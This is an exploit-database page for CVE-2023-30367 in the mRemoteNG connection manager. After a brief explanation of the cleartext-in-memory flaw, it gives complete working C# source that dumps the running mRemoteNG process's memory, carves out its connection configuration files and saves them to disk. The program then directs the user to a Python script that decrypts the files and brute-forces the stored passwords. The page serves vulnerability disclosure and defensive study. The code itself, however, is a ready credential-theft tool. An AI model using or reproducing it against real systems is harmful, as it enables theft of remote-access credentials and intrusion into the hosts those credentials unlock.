---
title: mRemoteNG 1.77.3.1784-NB Sensitive Information Extraction
url: https://cxsecurity.com/issue/WLB-2023070085
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-08-01
fetch_date: 2025-10-06T16:58:43.220770
---

# mRemoteNG 1.77.3.1784-NB Sensitive Information Extraction

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **mRemoteNG 1.77.3.1784-NB Sensitive Information Extraction** **2023.07.31**  Credit:  **[Maximilian Barz](https://cxsecurity.com/author/Maximilian%2BBarz/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-30367](https://cxsecurity.com/cveshow/CVE-2023-30367/ "Click to see CVE-2023-30367")**  CWE: **N/A** | |

# Exploit Title: mRemoteNG v1.77.3.1784-NB - Cleartext Storage of Sensitive Information in Memory
# Google Dork: -
# Date: 21.07.2023
# Exploit Author: Maximilian Barz
# Vendor Homepage: https://mremoteng.org/
# Software Link: https://mremoteng.org/download
# Version: mRemoteNG <= v1.77.3.1784-NB
# Tested on: Windows 11
# CVE : CVE-2023-30367
/\*
Multi-Remote Next Generation Connection Manager (mRemoteNG) is free software that enables users to
store and manage multi-protocol connection configurations to remotely connect to systems.
mRemoteNG configuration files can be stored in an encrypted state on disk. mRemoteNG version <= v1.76.20 and <= 1.77.3-dev
loads configuration files in plain text into memory (after decrypting them if necessary) at application start-up,
even if no connection has been established yet. This allows attackers to access contents of configuration files in plain text
through a memory dump and thus compromise user credentials when no custom password encryption key has been set.
This also bypasses the connection configuration file encryption setting by dumping already decrypted configurations from memory.
Full Exploit and mRemoteNG config file decryption + password bruteforce python script: https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper
\*/
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
namespace mRemoteNGDumper
{
public static class Program
{
public enum MINIDUMP\_TYPE
{
MiniDumpWithFullMemory = 0x00000002
}
[StructLayout(LayoutKind.Sequential, Pack = 4)]
public struct MINIDUMP\_EXCEPTION\_INFORMATION
{
public uint ThreadId;
public IntPtr ExceptionPointers;
public int ClientPointers;
}
[DllImport("kernel32.dll")]
static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
[DllImport("Dbghelp.dll")]
static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, SafeHandle hFile, MINIDUMP\_TYPE DumpType, ref MINIDUMP\_EXCEPTION\_INFORMATION ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
static void Main(string[] args)
{
string input;
bool configfound = false;
StringBuilder filesb;
StringBuilder linesb;
List<string> configs = new List<string>();
Process[] localByName = Process.GetProcessesByName("mRemoteNG");
if (localByName.Length == 0) {
Console.WriteLine("[-] No mRemoteNG process was found. Exiting");
System.Environment.Exit(1);
}
string assemblyPath = Assembly.GetEntryAssembly().Location;
Console.WriteLine("[+] Creating a memory dump of mRemoteNG using PID {0}.", localByName[0].Id);
string dumpFileName = assemblyPath + "\_" + DateTime.Now.ToString("dd.MM.yyyy.HH.mm.ss") + ".dmp";
FileStream procdumpFileStream = File.Create(dumpFileName);
MINIDUMP\_EXCEPTION\_INFORMATION info = new MINIDUMP\_EXCEPTION\_INFORMATION();
// A full memory dump is necessary in the case of a managed application, other wise no information
// regarding the managed code will be available
MINIDUMP\_TYPE DumpType = MINIDUMP\_TYPE.MiniDumpWithFullMemory;
MiniDumpWriteDump(localByName[0].Handle, (uint)localByName[0].Id, procdumpFileStream.SafeFileHandle, DumpType, ref info, IntPtr.Zero, IntPtr.Zero);
procdumpFileStream.Close();
filesb = new StringBuilder();
Console.WriteLine("[+] Searching for configuration files in memory dump.");
using (StreamReader reader = new StreamReader(dumpFileName))
{
while (reader.Peek() >= 0)
{
input = reader.ReadLine();
string pattern = @"(\<Node)(.\*)(?=\/>)\/>";
Match m = Regex.Match(input, pattern, RegexOptions.IgnoreCase);
if (m.Success)
{
configfound = true;
foreach (string config in m.Value.Split('>'))
{
configs.Add(config);
}
}
}
reader.Close();
if (configfound)
{
string currentDir = System.IO.Directory.GetCurrentDirectory();
string dumpdir = currentDir + "/dump";
if (!Directory.Exists(dumpdir))
{
Directory.CreateDirectory(dumpdir);
}
string savefilepath;
for (int i =0; i < configs.Count;i++)
{
if (!string.IsNullOrEmpty(configs[i]))
{
savefilepath = currentDir + "\\dump\\extracted\_Configfile\_mRemoteNG\_" + i+"\_" + DateTime.Now.ToString("dd.MM.yyyy.HH.mm") + "\_confCons.xml";
Console.WriteLine("[+] Saving extracted configuration file to: " + savefilepath);
using (StreamWriter writer = new StreamWriter(savefilepath))
{
writer.Write(configs[i]+'>');
writer.Close();
}
}
}
Console.WriteLine("[+] Done!");
Console.WriteLine("[+] Deleting memorydump file!");
File.Delete(dumpFileName);
Console.WriteLine("[+] To decrypt mRemoteNG configuration files and get passwords in cleartext, execute: mremoteng\_decrypt.py\r\n Example: python3 mremoteng\_decrypt.py -rf \""+ currentDir + "\\dump\\extracted\_Configfile\_mRemoteNG\_0\_" + DateTime.Now.ToString("dd.MM.yyyy.HH.mm") + "\_confCons.xml\"" );
}
else
{
Console.WriteLine("[-] No configuration file found in memorydump. Exiting");
Console.WriteLine("[+] Deleting memorydump file!");
File.Delete(dumpFileName);
}
}
}
}
}

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023070085)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top